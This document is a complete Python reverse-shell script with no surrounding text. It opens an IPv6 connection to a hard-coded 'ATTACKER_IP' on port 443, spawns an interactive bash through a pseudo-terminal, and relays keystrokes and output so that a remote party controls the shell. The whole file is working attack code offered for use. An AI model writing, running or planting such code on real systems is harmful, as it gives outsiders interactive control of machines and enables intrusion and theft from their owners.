import socket
import subprocess
import os
import pty
import select
import sys

def connect():
    ATTACKER_IP = '2a02:214c:882a:c00:3509:7016:74fe:94a2'  # Your Windows IPv6
    ATTACKER_PORT = 443
    
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(30)
        print(f"[*] Connecting to [{ATTACKER_IP}]:{ATTACKER_PORT}...", file=sys.stderr)
        s.connect((ATTACKER_IP, ATTACKER_PORT, 0, 0))
        print(f"[+] Connected!", file=sys.stderr)
    except socket.error as e:
        print(f"[!] Connection failed: {e}", file=sys.stderr)
        sys.exit(1)
    
    # Create a pseudo-terminal
    master, slave = pty.openpty()
    
    # Fork a shell process
    pid = os.fork()
    if pid == 0:  # Child process
        os.close(master)
        os.setsid()  # New session
        
        # Redirect shell's I/O to the slave side of PTY
        os.dup2(slave, 0)  # stdin
        os.dup2(slave, 1)  # stdout
        os.dup2(slave, 2)  # stderr
        os.close(slave)
        
        # Spawn interactive shell
        os.execv("/bin/bash", ["bash", "-i"])
    
    # Parent process (attacker handler)
    os.close(slave)
    
    # Set non-blocking I/O
    os.set_blocking(s.fileno(), False)
    os.set_blocking(master, False)
    
    print(f"[+] Shell spawned. Entering I/O loop...", file=sys.stderr)
    
    while True:
        try:
            ready_to_read, _, _ = select.select(
                [s, master],
                [],
                [],
                1.0
            )
            
            # Data from attacker's socket → send to shell (stdin)
            if s in ready_to_read:
                try:
                    data = s.recv(4096)
                    if not data:  # Connection closed
                        print("[*] Attacker closed connection", file=sys.stderr)
                        break
                    os.write(master, data)
                except Exception as e:
                    print(f"[!] Socket recv error: {e}", file=sys.stderr)
                    break
            
            # Data from shell's output → send to attacker
            if master in ready_to_read:
                try:
                    data = os.read(master, 4096)
                    if not data:  # EOF from shell
                        print("[*] Shell exited", file=sys.stderr)
                        break
                    s.sendall(data)
                except Exception as e:
                    print(f"[!] PTY read error: {e}", file=sys.stderr)
                    break
        
        except KeyboardInterrupt:
            print("\n[*] Interrupted", file=sys.stderr)
            break
        except Exception as e:
            print(f"[!] Select error: {e}", file=sys.stderr)
            break
    
    # Cleanup
    os.close(master)
    s.close()
    os.waitpid(pid, 0)
    print("[*] Reverse shell closed", file=sys.stderr)

if __name__ == "__main__":
    connect()
